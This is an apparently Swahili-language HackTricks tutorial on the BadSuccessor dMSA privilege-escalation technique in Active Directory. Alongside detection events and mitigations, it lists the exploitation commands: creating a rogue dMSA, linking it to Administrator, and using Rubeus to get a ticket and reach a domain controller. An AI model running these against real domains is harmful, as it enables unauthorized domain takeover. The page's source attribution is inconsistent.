# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Delegated Managed Service Accounts (**dMSA**) ni successor wa kizazi kijacho wa **gMSA** unaokuja katika Windows Server 2025. Workflow halali ya migration inaruhusu administrators kubadilisha account *ya zamani* (user, computer au service account) na kutumia dMSA huku permissions zikihifadhiwa kwa uwazi. Workflow hii hutolewa kupitia PowerShell cmdlets kama `Start-ADServiceAccountMigration` na `Complete-ADServiceAccountMigration`, na hutegemea LDAP attributes mbili za **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* ya account iliyobadilishwa (account ya zamani).
* **`msDS-DelegatedMSAState`**       – hali ya migration (`0` = none, `1` = in-progress, `2` = *completed*).<sup>[[1]](#references)</sup>

Ikiwa attacker anaweza kuunda dMSA **yoyote** ndani ya OU na kubadilisha moja kwa moja attributes hizo 2, LSASS na KDC zitachukulia dMSA hiyo kuwa *successor* wa account iliyounganishwa. Attacker anapothibitisha baadaye akiwa kama dMSA, **atarithi privileges zote za account iliyounganishwa** – hadi **Domain Admin** ikiwa account ya Administrator imeunganishwa.<sup>[[1]](#references)</sup>

Technique hii iliitwa **BadSuccessor** na Unit 42 mwaka wa 2025. Microsoft baadaye iliipa **CVE-2025-53779** na ikatoa security update mnamo **August 2025**. Technique hii bado ni muhimu katika environments za Windows Server 2025 ambazo hazijafanyiwa update na katika ukaguzi wa OU delegation hatari.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Masharti ya attack

1. Account ambayo *inaruhusiwa* kuunda objects ndani ya **Organizational Unit (OU)** *na* ina angalau mojawapo ya:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. Muunganisho wa mtandao kwa LDAP na Kerberos (hali ya kawaida ya domain joined / remote attack).<sup>[[1]](#references)</sup>

## Ku-enumerate OUs Zilizo Vulnerable

Unit 42 ilitoa PowerShell helper script inayoparses security descriptors za kila OU na kuonyesha ACEs zinazohitajika:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Chini ya pazia, script huendesha LDAP search yenye paging kwa `(objectClass=organizationalUnit)` na hukagua kila `nTSecurityDescriptor` kwa

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (object class *msDS-DelegatedManagedServiceAccount*)

## Hatua za Exploitation

Mara tu OU inayoweza kuandikwa inapobainishwa, attack inahitaji LDAP writes 3 pekee:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Baada ya replication, attacker anaweza **logon** kama `attacker_dMSA$` au kuomba Kerberos TGT – Windows itaunda token ya account *superseded*.<sup>[[1]](#references)</sup>

### Uendeshaji otomatiki

PoCs kadhaa za public hufunga workflow nzima, ikijumuisha password retrieval na ticket management:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Utambuzi na Utafutaji

Washa **Object Auditing** kwenye OUs na fuatilia Windows Security Events zifuatazo:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Uundaji wa object ya **dMSA**
* **5136** – Marekebisho ya **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Mabadiliko mahususi ya attribute
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Utoaji wa TGT kwa dMSA

Kuhusianisha `4662` (marekebisho ya attribute), `4741` (uundaji wa computer/service account) na `4624` (logon inayofuata) huonyesha haraka shughuli za BadSuccessor. XDR solutions kama **XSIAM** huja na queries zilizo tayari kutumika (angalia references).<sup>[[2]](#references)</sup>

## Kupunguza Hatari

* Tumia security update ya Microsoft kwa **CVE-2025-53779** na uhakikishe patch level ya kila domain controller ya Windows Server 2025.<sup>[[6]](#references)</sup>
* Tumia kanuni ya **least privilege** – gawa usimamizi wa *Service Account* kwa roles zinazoaminika pekee.
* Ondoa `Create Child` / `msDS-DelegatedManagedServiceAccount` kwenye OUs ambazo hazihitaji waziwazi ruhusa hiyo.
* Fuatilia event IDs zilizoorodheshwa hapo juu na toa alert wakati identities zisizo za *Tier-0* zinapounda au kuhariri dMSAs.

## Tazama pia


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Kutumia vibaya dMSA ili Kuongeza Privileges katika Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Accounts Nzuri Zinapokuwa Mbaya: Kutumia vibaya Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
